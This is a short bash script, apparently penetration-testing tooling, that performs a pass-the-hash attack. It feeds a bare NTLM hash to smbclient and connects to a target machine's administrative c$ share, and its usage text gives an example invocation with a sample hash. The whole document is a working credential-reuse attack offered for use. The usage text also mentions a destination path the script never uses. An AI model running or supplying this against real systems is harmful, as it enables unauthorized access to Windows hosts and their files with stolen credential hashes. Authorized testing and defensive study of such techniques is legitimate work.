#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password>"
	echo "Username should be <DOMAIN>/<User>"
	echo "Note that the password hash is JUST the NTLM hash.  There's no LMHash:NTLM Hash like in other pth attacks."
	echo ""
	echo "Destination Path should be something like /Users/<username>"
	echo "$0 TargetSystem.mydomain.local MYDOMAIN/SomeUser bd16e53fa8b531ef39825474afa7187c"
	echo "Note that this is currently set up to only key off of the c$ share"
}

if [ $# -lt 3 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"

smbclient //$TARGET/c$ -U $USERNAME%$PASSWORD --pw-nt-hash 

